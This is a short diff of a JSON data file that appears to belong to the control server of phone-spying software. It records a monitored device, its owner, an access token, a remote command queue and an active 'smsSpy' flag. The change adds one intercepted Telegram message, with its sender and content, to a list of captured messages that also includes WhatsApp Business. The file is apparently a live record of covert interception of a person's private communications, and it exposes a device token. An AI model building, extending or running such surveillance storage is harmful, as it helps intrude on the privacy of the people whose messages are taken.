@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775631633595,
+    "lastSeen": 1775631636611,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Alifzx rezz",
+        "content": "Ya",
+        "time": "08/04 14:00",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775631639341
+      },
       {
         "appName": "WA Business",
         "sender": "WA Business",
